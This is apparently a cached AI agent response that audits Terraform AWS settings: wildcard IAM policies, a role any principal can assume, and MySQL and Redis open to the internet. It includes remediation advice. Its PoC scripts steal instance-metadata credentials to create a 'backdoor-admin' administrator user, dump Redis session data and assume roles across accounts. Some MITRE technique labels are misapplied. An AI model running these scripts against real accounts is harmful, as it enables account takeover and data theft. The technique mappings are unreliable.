{
  "version": "1.0.0",
  "agent": "claude-code",
  "model": "claude-code",
  "prompt_hash": "49501022d54b1a9424f79984348ba98a66d04e5d8cf7e96e75c779e34e9b367e",
  "response": "{\"scratchpad\":\"Terraform IaC analysis for AWS security configuration. 分析対象: AWS security groups と IAM role/policy. 以下の脆弱性を検出: (1) IAM ポリシー: Action=\\\"*\\\", Resource=\\\"*\\\" による過度な権限付与 (T1484 Privilege Escalation), (2) Security Groups: 0.0.0.0/0 からの MySQL/Redis へのアクセス許可 (T1078 Lateral Movement), (3) IAM Role: Principal=\\\"*\\\" での AssumeRole 許可 (AFO - Authority/Access Control Failure), (4) Application port 3000 の全世界公開 (T1078 Unauthenticated Access).\",\"analysis\":\"このTerraformコードは、多くの業界標準とベストプラクティスに違反する複数の重大なセキュリティ脆弱性を含んでいます。\\n\\n1. **IAM ポリシー (lines 145-160)**: 最も危険な設定として、Action=\\\\\\\"*\\\\\\\" と Resource=\\\\\\\"*\\\\\\\" が設定されており、これはこのロールに関連付けられたすべてのエンティティに対してAWS内のすべてのアクションを実行する権限を無制限に付与します。これは MITRE T1484 (Domain/Account Admin Privilege Escalation) に相当し、攻撃者がこのロールを侵害した場合、AWS環境全体を制御できます。\\n\\n2. **IAM ロール信頼ポリシー (lines 115-143)**: Principal=\\\\\\\"*\\\\\\\" で sts:AssumeRole を許可しており、任意の AWS プリンシパルがこのロールを引き受けることができます。これは Account Takeover (AFO) の前触れであり、組織内外からの権限昇格を可能にします。\\n\\n3. **Security Groups - Database (lines 54-87)**: MySQL ポート 3306 に対して cidr_blocks=[\\\\\\\"0.0.0.0/0\\\\\\\"] が設定されており、インターネット上の任意のホストがデータベースに直接接続できます。これは MITRE T1078 (Valid Accounts - Lateral Movement) および AFO (Authority Failure) に相当し、データベースが外部から直接探索・攻撃が可能になります。\\n\\n4. **Security Groups - Cache (lines 89-113)**: Redis キャッシュサーバー (port 6379) も 0.0.0.0/0 から公開されており、認証なしで Redis に接続可能です。Redis への未認証アクセスにより、キャッシュデータの盗聴、改ざん、リモートコード実行が可能です。\\n\\n5. **Security Groups - App Server (lines 3-52)**: アプリケーションポート 3000 も 0.0.0.0/0 から公開され、本来ロードバランサー経由でのみアクセスすべきです。\\n\\n6. **Unrestricted Egress (全SG)**: すべてのセキュリティグループで egress が 0.0.0.0/0 に設定されており、侵害されたインスタンスからの外部通信に制限がありません。\",\"poc\":\"# PoC 1: IAM Privilege Escalation via overpermissioned role\\n# 前提: Application EC2 インスタンスで実行可能なIAM ロール\\n\\nimport boto3\\nimport requests\\n\\n# EC2 インスタンスメタデータからロール認証情報を取得\\niam_role_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\\nresponse = requests.get(iam_role_url)\\nrole_name = response.text\\n\\ncreds_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'\\ncreds_response = requests.get(creds_url)\\ncredentials = creds_response.json()\\n\\n# 侵害されたロール認証情報を使用してIAM ユーザーを作成\\niam_client = boto3.client(\\n    'iam',\\n    aws_access_key_id=credentials['AccessKeyId'],\\n    aws_secret_access_key=credentials['SecretAccessKey'],\\n    aws_session_token=credentials['Token']\\n)\\n\\n# 新しい管理者ユーザーを作成\\niam_client.create_user(UserName='backdoor-admin')\\niam_client.attach_user_policy(\\n    UserName='backdoor-admin',\\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\\n)\\n\\nprint('[+] Backdoor admin user created with full AWS access')\\n\\n# PoC 2: Database Reconnaissance via unrestricted MySQL access\\n# MySQL ポート 3306 への無制限アクセス\\n\\nimport socket\\n\\ntarget_db_instance_endpoint = \\\"app-db.xxxxx.rds.amazonaws.com\\\"  # Terraform で作成されるDB\\nport = 3306\\n\\nsocket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nresult = socket_obj.connect_ex((target_db_instance_endpoint, port))\\n\\nif result == 0:\\n    print(f'[+] Database port {port} is open and accessible from internet')\\n    # ここから MySQL プロトコルハンドシェイクを開始し、クレデンシャルブルートフォース攻撃\\n    socket_obj.close()\\n\\n# PoC 3: Redis Cache Exploitation\\n# Redis ポート 6379 への無制限アクセス (通常は認証なし)\\n\\nimport redis\\n\\ntry:\\n    r = redis.Redis(\\n        host='app-cache.xxxxx.elasticache.amazonaws.com',\\n        port=6379,\\n        decode_responses=True,\\n        socket_connect_timeout=5\\n    )\\n    # キャッシュからセッションデータを読み取り\\n    keys = r.keys('session:*')\\n    for key in keys:\\n        session_data = r.get(key)\\n        print(f'[+] Exposed session data: {session_data}')\\nexcept Exception as e:\\n    print(f'[-] Redis connection failed: {e}')\\n\\n# PoC 4: Cross-account role assumption\\n# assume_role_policy で Principal: AWS = \\\\\\\"*\\\\\\\" が許可されている\\n\\nimport boto3\\n\\n# 攻撃者のAWSアカウントから対象ロールを引き受け\\nsts_client = boto3.client('sts')\\n\\ntry:\\n    assumed_role = sts_client.assume_role(\\n        RoleArn='arn:aws:iam::ACCOUNT_ID:role/TARGET-app-role',\\n        RoleSessionName='attacker-session',\\n        DurationSeconds=3600\\n    )\\n    print('[+] Successfully assumed target role from external account')\\n    print(f'[+] Temporary credentials obtained: {assumed_role}')\\nexcept Exception as e:\\n    print(f'[-] Role assumption failed: {e}')\",\"confidence_score\":100,\"vulnerability_types\":[\"AFO\",\"T1484\",\"T1078\",\"IAM-PrivilegeEscalation\",\"NetworkMisconfig\"],\"par_analysis\":{\"principals\":[{\"identifier\":\"aws_iam_role.app_role with assume_role_policy Principal=*\",\"trust_level\":\"untrusted\",\"source_context\":\"Any AWS principal (within AWS ecosystem) can assume this role\",\"risk_factors\":[\"No account ID restriction\",\"No condition-based restrictions\",\"Wildcard principal allows cross-account assumption\",\"No time-based or IP-based restrictions\"]},{\"identifier\":\"EC2 instances with app_role attached\",\"trust_level\":\"semi_trusted\",\"source_context\":\"EC2 instances can obtain temporary credentials via instance metadata service\",\"risk_factors\":[\"IMDSv1 vulnerable to SSRF attacks for credential theft\",\"Instance compromise leads to role compromise\",\"Role has unrestricted permissions\"]},{\"identifier\":\"External network traffic (0.0.0.0/0)\",\"trust_level\":\"untrusted\",\"source_context\":\"Internet-facing ports expose services to untrusted sources\",\"risk_factors\":[\"MySQL database directly exposed\",\"Redis cache directly exposed\",\"Application port accessible without authentication\"]}],\"actions\":[{\"identifier\":\"IAM Policy: Action=*, Resource=*\",\"security_function\":\"Authorization control for AWS resource operations\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"No action restriction - all AWS operations permitted\",\"No resource restriction - all resources accessible\",\"No condition-based restrictions\",\"Violates principle of least privilege\",\"Equivalent to IAM AdministratorAccess policy\"],\"bypass_vectors\":[\"Any code execution within EC2 instance can use role credentials to perform any AWS operation\",\"Role assumption from any AWS principal bypasses all controls\",\"No way to revoke permissions without deleting role\"]},{\"identifier\":\"IAM AssumeRole Policy: Principal=*\",\"security_function\":\"Control which principals can assume the role\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"Wildcard principal allows any AWS principal\",\"No account restriction\",\"No organization ID restriction\",\"No MFA requirement\",\"No external ID requirement for cross-account access\"],\"bypass_vectors\":[\"Any AWS account can assume this role\",\"No authentication mechanism beyond AWS signature\",\"Credentials obtained from role can be used for any operation\"]},{\"identifier\":\"Security Group: cidr_blocks=[0.0.0.0/0] for database/cache\",\"security_function\":\"Network access control for sensitive backend services\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"MySQL exposed to internet without IP restriction\",\"Redis exposed to internet without IP restriction\",\"No network segmentation between tiers\",\"No VPC endpoint usage\"],\"bypass_vectors\":[\"Direct network scanning discovers open ports\",\"MySQL/Redis can be accessed without authentication if exposed\",\"No WAF or network intrusion detection\"]},{\"identifier\":\"Security Group: Unrestricted egress (0.0.0.0/0)\",\"security_function\":\"Outbound traffic control for lateral movement prevention\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"Compromised instances can communicate with external systems\",\"No DNS filtering\",\"No outbound port restrictions\",\"Allows data exfiltration\"],\"bypass_vectors\":[\"C2 communication channels can be established\",\"Data can be exfiltrated to attacker infrastructure\"]}],\"resources\":[{\"identifier\":\"AWS IAM - All operations (*:*)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Identity and access management - all AWS services\",\"protection_mechanisms\":[\"AWS API authentication (signature version 4)\",\"No additional authorization controls in policy\"]},{\"identifier\":\"RDS MySQL Database (port 3306)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"Relational database access\",\"protection_mechanisms\":[\"Security group rule (inadequate - allows 0.0.0.0/0)\",\"Database user authentication (not configurable in this Terraform)\",\"No network segmentation\"]},{\"identifier\":\"ElastiCache Redis (port 6379)\",\"sensitivity_level\":\"high\",\"operation_type\":\"Cache and session storage\",\"protection_mechanisms\":[\"Security group rule (inadequate - allows 0.0.0.0/0)\",\"Redis AUTH (not configured - default no authentication)\",\"No encryption in transit\"]},{\"identifier\":\"EC2 Application Server (port 3000)\",\"sensitivity_level\":\"high\",\"operation_type\":\"Web application access\",\"protection_mechanisms\":[\"Security group (inadequate - allows 0.0.0.0/0)\",\"No mention of TLS/mTLS enforcement\",\"Application layer authentication (external to this config)\"]}],\"policy_violations\":[{\"rule_id\":\"IAM-OVERPERMISSIONED-POLICY\",\"rule_description\":\"AWS IAM policy grants all actions on all resources\",\"violation_path\":\"Principal (any) -> IAM AssumeRole (Principal=*) -> IAM Policy (Action=*, Resource=*) -> All AWS Resources\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"IAM-WILDCARD-ASSUME-ROLE\",\"rule_description\":\"IAM role trust policy allows assumption from any AWS principal\",\"violation_path\":\"External AWS Principal -> IAM AssumeRole (Principal=*) -> app_role -> All AWS Resources\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"NETWORK-DATABASE-EXPOSURE\",\"rule_description\":\"RDS MySQL database exposed to internet (0.0.0.0/0)\",\"violation_path\":\"Internet Traffic (0.0.0.0/0) -> Security Group Ingress (0.0.0.0/0:3306) -> RDS MySQL Database\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"NETWORK-CACHE-EXPOSURE\",\"rule_description\":\"Redis cache exposed to internet (0.0.0.0/0)\",\"violation_path\":\"Internet Traffic (0.0.0.0/0) -> Security Group Ingress (0.0.0.0/0:6379) -> ElastiCache Redis\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"NETWORK-UNRESTRICTED-EGRESS\",\"rule_description\":\"Unrestricted outbound traffic (0.0.0.0/0) enables data exfiltration and C2\",\"violation_path\":\"Compromised EC2 Instance -> Unrestricted Egress (0.0.0.0/0) -> External Systems\",\"severity\":\"high\",\"confidence\":0.95},{\"rule_id\":\"NETWORK-APP-PORT-EXPOSURE\",\"rule_description\":\"Application port 3000 exposed to internet without load balancer\",\"violation_path\":\"Internet Traffic (0.0.0.0/0) -> Security Group Ingress (0.0.0.0/0:3000) -> Application Server\",\"severity\":\"high\",\"confidence\":0.9}]},\"remediation_guidance\":{\"policy_enforcement\":[{\"component\":\"aws_iam_policy.app_policy\",\"required_improvement\":\"Replace wildcard permissions with specific, least-privilege actions\",\"specific_guidance\":\"Define Action as specific operations needed by the application (e.g., [\\\\\\\"s3:GetObject\\\\\\\", \\\\\\\"ec2:DescribeInstances\\\\\\\", \\\\\\\"secretsmanager:GetSecretValue\\\\\\\"] based on actual requirements). Define Resource as specific ARNs (e.g., arn:aws:s3:::my-bucket/*) instead of wildcard. Use policy conditions to restrict based on IP, time, MFA, etc.\",\"priority\":\"critical\"},{\"component\":\"aws_iam_role.app_role assume_role_policy\",\"required_improvement\":\"Restrict Principal to specific AWS accounts and services\",\"specific_guidance\":\"Replace Principal { AWS = \\\\\\\"*\\\\\\\" } with Principal { AWS = \\\\\\\"arn:aws:iam::YOUR_ACCOUNT_ID:root\\\\\\\" }. Add Principal { Service = [\\\\\\\"ec2.amazonaws.com\\\\\\\"] } only if needed. Consider requiring external_id and mfa_required for cross-account access. Use condition statements: \\\\\\\"aws:PrincipalOrgID\\\\\\\": \\\\\\\"o-xxxxxxxxxx\\\\\\\"\",\"priority\":\"critical\"},{\"component\":\"aws_security_group.database ingress\",\"required_improvement\":\"Restrict MySQL access to application tier only\",\"specific_guidance\":\"Replace cidr_blocks = [\\\\\\\"0.0.0.0/0\\\\\\\"] with security_groups = [aws_security_group.app_server.id] to allow only app_server SG. Add description documenting why this rule exists. Consider using AWS RDS Proxy with IAM database authentication. Implement VPC endpoints for private access.\",\"priority\":\"critical\"},{\"component\":\"aws_security_group.cache ingress\",\"required_improvement\":\"Restrict Redis access to application tier only\",\"specific_guidance\":\"Replace cidr_blocks = [\\\\\\\"0.0.0.0/0\\\\\\\"] with security_groups = [aws_security_group.app_server.id]. Enable ElastiCache AUTH (AUTH token) for additional protection. Enable encryption in transit and at rest. Consider Redis as a managed ElastiCache rather than direct exposure.\",\"priority\":\"critical\"},{\"component\":\"aws_security_group.app_server ingress on port 3000\",\"required_improvement\":\"Route traffic through load balancer instead of direct exposure\",\"specific_guidance\":\"Remove the port 3000 ingress rule exposing directly to 0.0.0.0/0. Instead create an aws_security_group for ALB/NLB and allow port 3000 ingress only from that SG. Configure ALB to listen on 443 (HTTPS) and forward to app_server on 3000. Implement WAF rules on the ALB.\",\"priority\":\"high\"},{\"component\":\"All security_group egress rules\",\"required_improvement\":\"Implement egress filtering based on actual requirements\",\"specific_guidance\":\"Replace default 0.0.0.0/0 with specific destinations: (1) if no outbound needed, set to empty, (2) if DNS needed, add port 53 to 0.0.0.0/0, (3) if AWS API calls needed, create VPC endpoints, (4) if external APIs needed, whitelist specific FQDNs with DNS validation. Document each egress rule with business justification.\",\"priority\":\"high\"},{\"component\":\"Overall architecture\",\"required_improvement\":\"Implement network segmentation and assume role federation\",\"specific_guidance\":\"Create separate security groups for each tier (ALB -> App -> DB, etc.). Implement cross-account role access only through assumed roles with conditions (IP, MFA, time). Enable VPC Flow Logs for auditing. Use AWS Systems Manager Session Manager instead of SSH on port 22 with bastion. Enable GuardDuty for threat detection. Implement SCPs (Service Control Policies) at organization level.\",\"priority\":\"critical\"}]},\"file_path\":null,\"pattern_description\":null,\"matched_source_code\":null}",
  "metadata": {
    "created_at": "2025-12-30T17:22:14.050197Z",
    "last_accessed": "2025-12-30T17:22:14.050197Z",
    "access_count": 0,
    "prompt_size": 7573,
    "response_size": 15434
  }
}